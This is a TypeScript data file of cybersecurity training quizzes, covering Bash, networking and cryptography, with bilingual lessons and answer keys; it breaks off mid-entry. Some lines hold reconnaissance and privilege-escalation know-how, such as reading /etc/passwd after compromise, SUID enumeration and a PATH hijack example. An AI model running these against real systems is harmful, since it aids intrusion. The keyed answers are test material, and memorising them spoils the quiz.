import { SkillModule } from '../types';
import { getSavedLanguage, Language } from '../utils/language';

export const SKILL_MODULES: SkillModule[] = [
  // =========================================================================
  // MISSION 1: BASH & TERMINAL (Linux & Bash Fundamentals)
  // =========================================================================
  {
    id: 'mod_bash',
    title: 'BASH & TERMINAL',
    certificationFocus: 'CompTIA Security+ SY0-701 & Linux LPIC-1',
    color: '#06B6D4',
    nodes: [
      {
        id: 'node_basics_1',
        title: 'Terminal Anatomy: pwd, cd & ls',
        subtitle: 'Filesystem navigation and directory orientation in Linux',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Anatomia del Terminale e Percorsi Assoluti',
          keyTakeaway: 'Ogni processo Linux ha una Current Working Directory (CWD). "pwd" stampa il percorso assoluto dalla radice /.',
          syntaxExample: '$ pwd\n/home/operator/lab\n$ ls -la',
          operationalContext: 'Prima di lanciare qualsiasi script di test o rimozione, verifica sempre il percorso corrente con "pwd".'
        },
        questions: [
          {
            id: 'q_bash_pwd',
            title: 'Verify Working Directory in Shell',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Which command prints the full absolute path of your current shell directory?',
            options: [
              { id: 'bp_1', text: 'pwd (print working directory)', isCorrect: true },
              { id: 'bp_2', text: 'cd (change directory path)', isCorrect: false },
              { id: 'bp_3', text: 'whoami (current logged user)', isCorrect: false },
              { id: 'bp_4', text: 'echo $PATH (environment binaries)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Core Utilities: pwd',
              whyItWorks: 'pwd prints the exact absolute path starting from root /.',
              patchRecommendation: 'Use pwd to verify directory context before executing relative scripts.',
              terminalProof: '$ pwd\n/home/operator/lab'
            },
            xpReward: 30,
            eloReward: 8
          },
          {
            id: 'q_bash_terminal_ls',
            title: 'Terminal Sandbox: List Hidden Files',
            type: 'terminal_command',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Complete the command to display all files including hidden dotfiles (.env) with permissions:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'ls',
            commandTarget: 'ls -la',
            commandChips: ['-la', '-lh', '/tmp', '--color', '-R'],
            options: [
              { id: 'bl_1', text: '-la', isCorrect: true },
              { id: 'bl_2', text: '-R --color', isCorrect: false },
              { id: 'bl_3', text: '/tmp -lh', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Listing Directory Contents: ls -la',
              whyItWorks: 'The -a flag includes files beginning with . and -l gives detailed file permissions.',
              patchRecommendation: 'Audit hidden dotfiles (.env, .bash_history) during system hardening.',
              terminalProof: '$ ls -la\n-rw------- 1 operator operator 512 .env'
            },
            xpReward: 30,
            eloReward: 7
          }
        ]
      },
      {
        id: 'node_bash_2',
        title: 'File Permissions: chmod & chown',
        subtitle: 'Understanding Read, Write, Execute (rwx) octal permissions',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Permessi File Linux e Notazione Ottale',
          keyTakeaway: 'I permessi r=4, w=2, x=1 si sommano per Owner, Group e Others. "chmod 600" protegge file sensibili.',
          syntaxExample: '$ chmod 600 id_rsa\n$ chown root:root /etc/shadow',
          operationalContext: 'Le chiavi SSH e i file di credenziali (.env) devono avere permessi 600 (lettura/scrittura solo per il proprietario).'
        },
        questions: [
          {
            id: 'q_bash_chmod',
            title: 'Secure Sensitive SSH Private Key',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Which chmod permission ensures an SSH private key is readable only by the file owner?',
            options: [
              { id: 'ch_1', text: 'chmod 600 id_rsa (read/write only owner)', isCorrect: true },
              { id: 'ch_2', text: 'chmod 777 id_rsa (full world accessible)', isCorrect: false },
              { id: 'ch_3', text: 'chmod 644 id_rsa (world readable access)', isCorrect: false },
              { id: 'ch_4', text: 'chmod 755 id_rsa (world executable access)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-732: Incorrect Permission Assignment',
              whyItWorks: '600 gives rw- to the user and --- to group and others, preventing local privilege exposure.',
              patchRecommendation: 'Never assign 777 to private keys; SSH clients strictly reject world-readable keys.',
              terminalProof: '$ chmod 600 id_rsa\n$ ls -l id_rsa\n-rw------- 1 operator operator 1675 id_rsa'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_bash_3',
        title: 'Pipes & Text Filters: grep, cat & sort',
        subtitle: 'Piping stdout to stdin to filter and parse system telemetry',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Pipelining Linux e Filtraggio Flussi Dati',
          keyTakeaway: 'La pipe | connette lo stdout di un comando allo stdin del successivo. "grep -i" cerca stringhe case-insensitive.',
          syntaxExample: '$ cat /var/log/auth.log | grep "Failed password" | wc -l',
          operationalContext: 'L\'analisi dei log di sicurezza per individuare attacchi brute-force si basa su filtri grep concatenati.'
        },
        questions: [
          {
            id: 'q_bash_grep',
            title: 'Filter Failed SSH Authentication Attempts',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Which command filters lines containing "Failed password" in auth.log ignoring uppercase/lowercase?',
            options: [
              { id: 'gp_1', text: 'grep -i "Failed password" /var/log/auth.log', isCorrect: true },
              { id: 'gp_2', text: 'find -name "Failed password" /var/log/auth.log', isCorrect: false },
              { id: 'gp_3', text: 'cat /var/log/auth.log > "Failed password"', isCorrect: false },
              { id: 'gp_4', text: 'head -n 10 "Failed password" /var/log/auth.log', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Log Forensics: grep -i',
              whyItWorks: '-i performs case-insensitive matching across authentication logs.',
              patchRecommendation: 'Stream filtered logs to a central SIEM for automated brute-force alerts.',
              terminalProof: '$ grep -i "failed password" /var/log/auth.log | head -n 1\nOct 18 Failed password for invalid user admin'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_bash_4',
        title: 'Environment Variables & PATH Hijack',
        subtitle: 'How the shell resolves executables and exports session variables',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Variabili di Ambiente e Risoluzione Binari',
          keyTakeaway: 'La variabile $PATH contiene le cartelle in cui la shell cerca i comandi. Inserire "." in PATH è pericoloso.',
          syntaxExample: '$ echo $PATH\n/usr/local/bin:/usr/bin:/bin\n$ export SECRET="token_123"',
          operationalContext: 'Se uno script SUID invoca un comando relativo (es. "curl" invece di "/usr/bin/curl"), un attaccante può dirottare $PATH.'
        },
        questions: [
          {
            id: 'q_bash_path',
            title: 'Spot Dangerous PATH Configuration',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Why is having "." (current directory) at the beginning of PATH a severe security risk?',
            options: [
              { id: 'ph_1', text: 'Allows execution of malicious binaries placed in current folder', isCorrect: true },
              { id: 'ph_2', text: 'Prevents the shell from finding core system binaries like bash', isCorrect: false },
              { id: 'ph_3', text: 'Automatically gives root permissions to all executed scripts', isCorrect: false },
              { id: 'ph_4', text: 'Disables terminal history logging for the current session', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-426: Untrusted Search Path (PATH Hijack)',
              whyItWorks: 'If "." precedes /usr/bin, a rogue executable named "ls" in /tmp will be run instead of the real utility.',
              patchRecommendation: 'Never include "." in system PATH; always use absolute binary paths in privileged scripts.',
              terminalProof: '$ PATH=.:$PATH\n$ ./evil_ls invoked instead of /bin/ls'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_bash_5',
        title: 'Filesystem Hierarchy Standard (FHS)',
        subtitle: 'Key directory roles: /etc, /var/log, /tmp, and /proc',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Standard FHS: Mappa dei File di Sistema',
          keyTakeaway: '/etc ospita le configurazioni, /var/log i registri, /tmp è world-writable, /proc mappa i processi in memoria.',
          syntaxExample: '$ cat /etc/passwd\n$ ls -l /var/log/syslog\n$ cat /proc/version',
          operationalContext: 'La ricognizione post-compromissione parte sempre dalla verifica degli utenti in /etc/passwd e dei log in /var/log.'
        },
        questions: [
          {
            id: 'q_bash_fhs',
            title: 'Spot the Bug: Non-Existent Path',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'The administrator wants to inspect system settings. TAP THE LINE with the invalid directory path:',
            codeLines: [
              { lineNum: 1, code: '#!/bin/bash' },
              { lineNum: 2, code: 'echo "=== System Inspection ==="' },
              { lineNum: 3, code: 'cat /etc/config/app_settings.conf', isVulnerable: true, vulnerabilityHint: 'Under standard FHS, configurations reside in /etc/ or /etc/app/, not /etc/config/!' },
              { lineNum: 4, code: 'ls -la /var/log' }
            ],
            options: [
              { id: 'fhs_1', text: 'Line 3: non-existent path /etc/config', isCorrect: true },
              { id: 'fhs_2', text: 'Line 2: echo syntax invalid in bash', isCorrect: false },
              { id: 'fhs_3', text: 'Line 4: ls command requires root sudo', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Filesystem Hierarchy Standard (FHS)',
              whyItWorks: 'Linux stores global configuration directly in /etc. Verify paths before calling cat.',
              patchRecommendation: 'Test file existence with [ -f file ] before reading in scripts.',
              terminalProof: '$ cat /etc/config/app_settings.conf\ncat: No such file or directory'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_bash_6',
        title: 'Final Test: Terminal Operator Mastery',
        subtitle: 'Comprehensive evaluation on Linux shell commands and file security',
        moduleId: 'mod_bash',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Terminale',
          keyTakeaway: 'Dimostra la piena padronanza della navigazione, dell\'analisi dei permessi e della manipolazione dati da riga di comando.',
          syntaxExample: '$ find /var/log -type f -name "*.log" -exec grep -H "CRON" {} +',
          operationalContext: 'Questo test pratico certifica la tua idoneità operativa per le sfide avanzate di privilege escalation e difesa Blue Team.'
        },
        questions: [
          {
            id: 'q_bash_exam_1',
            title: 'Search Files by Modification Time & SUID',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Which command finds all files with SUID permission set (4000) starting from root directory?',
            options: [
              { id: 'be_1', text: 'find / -perm -4000 -type f 2>/dev/null', isCorrect: true },
              { id: 'be_2', text: 'grep -r "SUID" /usr/bin 2>/dev/null', isCorrect: false },
              { id: 'be_3', text: 'chmod 4000 /root -R 2>/dev/null', isCorrect: false },
              { id: 'be_4', text: 'ls -la / --filter=suid 2>/dev/null', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Security Auditing: SUID Enumeration',
              whyItWorks: 'find / -perm -4000 queries files with the SUID bit set; 2>/dev/null suppresses permission denied errors.',
              patchRecommendation: 'Audit SUID binaries regularly to eliminate unnecessary privileged execution vectors.',
              terminalProof: '$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_bash_exam_2',
            title: 'Archive and Compress Log Data',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Which tar flag creates a gzipped compressed archive of a folder?',
            options: [
              { id: 'be_tar1', text: 'tar -czvf backup.tar.gz /var/log', isCorrect: true },
              { id: 'be_tar2', text: 'tar -xvf backup.tar.gz /var/log', isCorrect: false },
              { id: 'be_tar3', text: 'zip -dump /var/log backup.tar.gz', isCorrect: false },
              { id: 'be_tar4', text: 'gzip --extract /var/log backup.tar', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Archival: tar -czvf',
              whyItWorks: '-c creates archive, -z uses gzip, -v verbose, -f specifies output file.',
              patchRecommendation: 'Store audit archives in read-only write-once storage to prevent tampering.',
              terminalProof: '$ tar -czvf backup.tar.gz /var/log\nbackup.tar.gz created successfully'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 2: PROTOCOLLI & RETI (Networking Core)
  // =========================================================================
  {
    id: 'mod_networking',
    title: 'PROTOCOLLI & RETI',
    certificationFocus: 'CompTIA Network+ & Cisco CCNA 200-301',
    color: '#3B82F6',
    nodes: [
      {
        id: 'node_basics_2',
        title: 'TCP/IP Model & Standard Well-Known Ports',
        subtitle: 'IANA port allocations (80, 443, 22, 53) and transport layers',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Porte Standard e Modello di Trasporto',
          keyTakeaway: 'Le porte 0-1023 sono "Well-Known": 22 SSH, 53 DNS, 80 HTTP, 443 HTTPS. TCP garantisce consegna, UDP privilegia velocità.',
          syntaxExample: '$ netstat -tuln\n$ nmap -p 22,80,443 192.168.1.1',
          operationalContext: 'Chiudere le porte non utilizzate è il primo passo della riduzione della superficie di attacco.'
        },
        questions: [
          {
            id: 'q_net_ports',
            title: 'Identify Encrypted Web Traffic Port',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Which standard TCP port is assigned to HTTPS for TLS encrypted web communication?',
            options: [
              { id: 'np_1', text: 'Port 443 (HTTPS over TLS)', isCorrect: true },
              { id: 'np_2', text: 'Port 80 (plaintext HTTP)', isCorrect: false },
              { id: 'np_3', text: 'Port 22 (SSH remote shell)', isCorrect: false },
              { id: 'np_4', text: 'Port 53 (DNS name lookup)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IANA Standard Ports: RFC 9110',
              whyItWorks: 'Port 443 terminates TLS tunnels to protect confidentiality and integrity of web traffic.',
              patchRecommendation: 'Disable plaintext port 80 or issue an immediate 301 redirect to port 443.',
              terminalProof: '$ curl -I https://zeroday.gg\nHTTP/2 200'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_2',
        title: 'TCP Three-Way Handshake (SYN, SYN-ACK, ACK)',
        subtitle: 'Connection establishment, sequence numbers, and reset flags',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Meccanismo di Handshake TCP',
          keyTakeaway: 'La connessione affidabile TCP inizia con SYN (client) -> SYN-ACK (server) -> ACK (client). Un flag RST chiude bruscamente la sessione.',
          syntaxExample: 'Client ---[SYN seq=100]---> Server\nServer <---[SYN-ACK seq=300 ack=101]--- Client\nClient ---[ACK seq=101 ack=301]---> Server',
          operationalContext: 'I SYN Flood Denial-of-Service saturano la tabella delle connessioni semi-aperte del server non inviando l\'ACK finale.'
        },
        questions: [
          {
            id: 'q_net_handshake',
            title: 'Analyze Handshake Sequence',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'What is the exact 3-step packet sequence to open a standard TCP connection?',
            options: [
              { id: 'hs_1', text: 'SYN -> SYN-ACK -> ACK', isCorrect: true },
              { id: 'hs_2', text: 'ACK -> SYN -> SYN-ACK', isCorrect: false },
              { id: 'hs_3', text: 'SYN -> ACK -> RST', isCorrect: false },
              { id: 'hs_4', text: 'FIN -> ACK -> FIN-ACK', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 793: Transmission Control Protocol',
              whyItWorks: 'SYN initiates synchronization, SYN-ACK acknowledges and replies, ACK completes setup.',
              patchRecommendation: 'Enable TCP SYN Cookies on servers to mitigate SYN flood attacks.',
              terminalProof: '$ tcpdump "tcp[tcpflags] & (tcp-syn) != 0"\nIP 10.0.0.5 > 10.0.0.1: Flags [S]'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_3',
        title: 'HTTP Status Codes & Security Headers',
        subtitle: '200 OK, 301 Redirect, 403 Forbidden, 500 Error and HSTS',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Codici di Stato HTTP e Header di Protezione',
          keyTakeaway: '2xx successo, 3xx redirect, 4xx errore client (403 forbidden, 404 not found), 5xx errore server. HSTS impedisce downgrade a HTTP.',
          syntaxExample: '$ curl -I https://zeroday.gg\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff',
          operationalContext: 'Gli header HSTS e Content-Security-Policy (CSP) neutralizzano gli attacchi di SSL stripping e XSS.'
        },
        questions: [
          {
            id: 'q_net_http_codes',
            title: 'Identify Resource Access Forbidden Code',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Which HTTP response code indicates the client is authenticated but lacks authorization to access the resource?',
            options: [
              { id: 'hc_1', text: '403 Forbidden (authenticated without access)', isCorrect: true },
              { id: 'hc_2', text: '401 Unauthorized (missing authentication)', isCorrect: false },
              { id: 'hc_3', text: '404 Not Found (resource does not exist)', isCorrect: false },
              { id: 'hc_4', text: '502 Bad Gateway (upstream proxy down)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 9110 HTTP Semantics: 403 vs 401',
              whyItWorks: '401 means credentials are required; 403 means identity is known but access is denied by policy.',
              patchRecommendation: 'Enforce Role-Based Access Control (RBAC) at controller level.',
              terminalProof: 'HTTP/1.1 403 Forbidden\nContent-Type: application/json'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_4',
        title: 'DNS Resolution & Name Server Records',
        subtitle: 'A, AAAA, CNAME, MX, TXT records and DNS spoofing risks',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Risoluzione Nomi di Dominio e Record DNS',
          keyTakeaway: 'DNS mappa nomi host in indirizzi IP (record A = IPv4, AAAA = IPv6). TXT viene usato per validazione SPF e DKIM.',
          syntaxExample: '$ dig A zeroday.gg +short\n$ nslookup -type=TXT _dmarc.corp.com',
          operationalContext: 'L\'avvelenamento della cache DNS (DNS Cache Poisoning) dirotta gli utenti su server clone malevoli.'
        },
        questions: [
          {
            id: 'q_net_dns',
            title: 'Query Mail Exchanger DNS Record',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Which DNS record type directs incoming email traffic to responsible mail server hosts?',
            options: [
              { id: 'dr_1', text: 'MX Record (Mail Exchanger routing)', isCorrect: true },
              { id: 'dr_2', text: 'A Record (IPv4 address mapping)', isCorrect: false },
              { id: 'dr_3', text: 'CNAME Record (canonical domain alias)', isCorrect: false },
              { id: 'dr_4', text: 'PTR Record (reverse IP to hostname)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 1035: Domain Names System Records',
              whyItWorks: 'MX specifies the priority and hostname of mail receiving servers for the domain.',
              patchRecommendation: 'Implement DNSSEC to sign DNS responses and eliminate spoofing.',
              terminalProof: '$ dig MX corp.com +short\n10 mail.corp.com.'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_5',
        title: 'Wireshark Packet Filters & Traffic Analysis',
        subtitle: 'Inspecting live pcap data with display filters and TCP stream reassembly',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Filtri Display Wireshark e Analisi Flussi',
          keyTakeaway: 'Wireshark consente di catturare e decodificare pacchetti. I filtri "http.request.method == POST" isolano credenziali trasmesse.',
          syntaxExample: 'tcp.flags.syn == 1 && tcp.flags.ack == 0\nip.addr == 192.168.1.100\nhttp.response.code >= 400',
          operationalContext: 'Il traffico in chiaro su porta 80 o Telnet (23) espone password e cookie di sessione a chiunque sia sullo stesso switch.'
        },
        questions: [
          {
            id: 'q_net_wireshark',
            title: 'Filter SYN Scan Packets in Wireshark',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Which Wireshark filter isolates SYN packets with ACK unset to detect incoming port scans?',
            options: [
              { id: 'ws_1', text: 'tcp.flags.syn == 1 && tcp.flags.ack == 0', isCorrect: true },
              { id: 'ws_2', text: 'ip.proto == "TCP" && frame.len > 1500', isCorrect: false },
              { id: 'ws_3', text: 'http.request.uri contains "syn_scan"', isCorrect: false },
              { id: 'ws_4', text: 'eth.type == 0x0800 && udp.port == 53', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Network Packet Analysis: TCP SYN Detection',
              whyItWorks: 'Initial SYN packets have SYN=1 and ACK=0, characteristic of half-open stealth scans.',
              patchRecommendation: 'Deploy IDS/IPS sensors with threshold rules for burst SYN rates.',
              terminalProof: '$ tshark -Y "tcp.flags.syn==1 and tcp.flags.ack==0"\nFrame 12: 192.168.1.5 -> 192.168.1.10 TCP 60'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_6',
        title: 'Final Test: Network Protocols Exam',
        subtitle: 'Comprehensive evaluation on TCP/IP stack, handshake, ports and traffic triage',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Networking',
          keyTakeaway: 'Verifica la tua abilità di diagnosi su handshake TCP, sniffing con Wireshark e segmentazione delle porte.',
          syntaxExample: '$ tcpdump -nn -i eth0 port 443\n$ curl -v https://api.corp.local',
          operationalContext: 'Questo esame finale convalida le competenze richieste per le certificazioni Cisco CCNA e CompTIA Network+.'
        },
        questions: [
          {
            id: 'q_net_exam_1',
            title: 'TCP Connection Abrupt Teardown',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Hardcore',
            prompt: 'Which TCP flag is transmitted to immediately reset or refuse a connection without waiting for a 4-way FIN closure?',
            options: [
              { id: 'ne_1', text: 'RST (Reset connection immediately)', isCorrect: true },
              { id: 'ne_2', text: 'FIN (Graceful finish negotiation)', isCorrect: false },
              { id: 'ne_3', text: 'PSH (Push buffer data to app)', isCorrect: false },
              { id: 'ne_4', text: 'URG (Urgent pointer prioritization)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 793: TCP Control Flags Architecture',
              whyItWorks: 'RST indicates that the receiving host refuses or immediately drops the connection.',
              patchRecommendation: 'Monitor RST bursts as indicators of port scanning or firewall packet rejection.',
              terminalProof: 'Flags [R.], seq 0, ack 102, win 0, length 0'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_net_exam_2',
            title: 'Identify Unencrypted File Transfer Protocol',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Which protocol transmits authentication credentials in cleartext over TCP port 21?',
            options: [
              { id: 'ne_ftp1', text: 'FTP (Standard Plaintext File Transfer)', isCorrect: true },
              { id: 'ne_ftp2', text: 'SFTP (SSH Encrypted File Transfer)', isCorrect: false },
              { id: 'ne_ftp3', text: 'FTPS (FTP over TLS Encrypted Tunnel)', isCorrect: false },
              { id: 'ne_ftp4', text: 'HTTPS (Web Encrypted File Transfer)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cleartext Protocol Exposure: Port 21',
              whyItWorks: 'FTP sends USER and PASS commands in cleartext, vulnerable to eavesdropping.',
              patchRecommendation: 'Decommission legacy FTP and replace with SFTP (SSH Port 22) or FTPS.',
              terminalProof: 'USER admin\n331 Password required\nPASS SecretPass123'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 3: CRITTOGRAFIA & HASH (Crypto Core)
  // =========================================================================
  {
    id: 'mod_crypto',
    title: 'CRITTOGRAFIA & HASH',
    certificationFocus: 'CompTIA Security+ SY0-701 & CEH v12',
    color: '#8B5CF6',
    nodes: [
      {
        id: 'node_basics_3',
        title: 'Hashing vs Reversible Encryption',
        subtitle: 'One-way mathematical digest vs two-way cipher decryption',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Hashing Unidirezionale vs Cifratura Reversibile',
          keyTakeaway: 'L\'hash è unidirezionale e a lunghezza fissa (es. SHA-256 = 64 caratteri hex). La cifratura usa una chiave ed è reversibile.',
          syntaxExample: '$ sha256sum file.txt\n$ openssl enc -aes-256-cbc -in file.txt -out file.enc',
          operationalContext: 'Le password degli utenti non devono MAI essere cifrate reversibilmente, ma sottoposte ad hash salato (CWE-256).'
        },
        questions: [
          {
            id: 'q_cry_hash_diff',
            title: 'Differentiate Hashing from Encryption',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'What fundamental property distinguishes cryptographic hashing from symmetric encryption?',
            options: [
              { id: 'hd_1', text: 'Hashing is one-way irreversible without a decryption key', isCorrect: true },
              { id: 'hd_2', text: 'Hashing produces output longer than original input size', isCorrect: false },
              { id: 'hd_3', text: 'Encryption operates without requiring secret keys', isCorrect: false },
              { id: 'hd_4', text: 'Hashing can be reversed by reversing character order', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cryptographic Hash Properties: Preimage Resistance',
              whyItWorks: 'One-way functions guarantee it is computationally infeasible to invert H(m) to find m.',
              patchRecommendation: 'Never store plain passwords or reversibly encrypted passwords in user databases.',
              terminalProof: '$ echo -n "secret" | sha256sum\n2bb80e5e7... (cannot be decrypted)'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_cry_2',
        title: 'Cryptographic Collisions: MD5 vs SHA-256',
        subtitle: 'Birthday paradox, collision attacks and deprecated algorithms',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Collisioni Crittografiche e Algoritmi Obsoleti',
          keyTakeaway: 'Una collisione si verifica quando due input diversi generano lo stesso hash. MD5 e SHA-1 sono deprecati per collisioni note.',
          syntaxExample: '$ md5sum cert1.pem\n$ md5sum cert2.pem\n# Stesso hash MD5, file diversi!',
          operationalContext: 'Gli standard industriali (FIPS 140-3) vietano l\'uso di MD5 e SHA-1 per le firme digitali.'
        },
        questions: [
          {
            id: 'q_cry_collision',
            title: 'Identify Deprecated Collision-Prone Algorithm',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Intermediate',
            prompt: 'Which hash algorithm is cryptographically broken due to demonstrated practical collision attacks?',
            options: [
              { id: 'cl_1', text: 'MD5 (Message Digest 5 - Broken)', isCorrect: true },
              { id: 'cl_2', text: 'SHA-256 (Secure Hash Algorithm 2)', isCorrect: false },
              { id: 'cl_3', text: 'SHA-512 (Secure Hash Algorithm 2)', isCorrect: false },
              { id: 'cl_4', text: 'BLAKE3 (Modern Fast Cryptographic Hash)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-328: Use of Weak Cryptographic Hash',
              whyItWorks: 'Researchers demonstrated practical MD5 collisions in seconds, enabling rogue TLS certificate generation.',
              patchRecommendation: 'Migrate all integrity checks and signatures to SHA-256, SHA-384, or SHA-512.',
              terminalProof: '$ openssl dgst -sha256 payload.bin'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_cry_3',
        title: 'Password Salting & Bcrypt / Argon2',
        subtitle: 'Defeating Rainbow Tables with cryptographic salts and work factors',
        moduleId: 'mod_crypto',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Salting delle Credenziali e Adaptive KDF',
          keyTakeaway: 'Il Salt è una stringa casuale univoca aggiunta prima dell\'hash. Rende inutili le tabelle Rainbow precalcolate.',
          syntaxExample: '$2b$12$e8Y... (Bcrypt: $2b$ = algoritmo, 12 = cost factor, salt + hash)',
          operationalContext: 'Argon2 e Bcrypt sono KDF lenti progettati per resistere agli attacchi brute-force su cluster GPU e ASIC.'
        },
        questions: [
          {
            id: 'q_cry_salting',
            title: 'Primary Purpose of Password Salt',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Intermediate',
            prompt: 'What primary attack vector is effectively neutralized by appending a unique salt to each user password?',
            options: [
              { id: 'st_1', text: 'Precomputed Rainbow Table attacks and duplicate hash mapping', isCorrect: true },
              { id: 'st_2', text: 'SQL Injection vulnerabilities in login database queries', isCorrect: false },
              { id: 'st_3', text: 'Cross-Site Scripting session cookie theft in browsers', isCorrect: false },
              { id: 'st_4', text: 'Network packet eavesdropping over unencrypted Wi-Fi links', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-759: Use of a One-Way Hash without a Salt',
              whyItWorks: 'Unique salts force the attacker to compute a brand new brute-force dictionary for each individual user.',
              patchRecommendation: 'Use Argon2id or Bcrypt with a work factor calibrating hashing time to ~250ms.',
              terminalProof: '$ bcrypt.hash("Password123", 12)\n$2b$12$D7p... unique salt included'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_cry_4',
        title: 'Symmetric (AES-GCM) vs Asymmetric (RSA)',
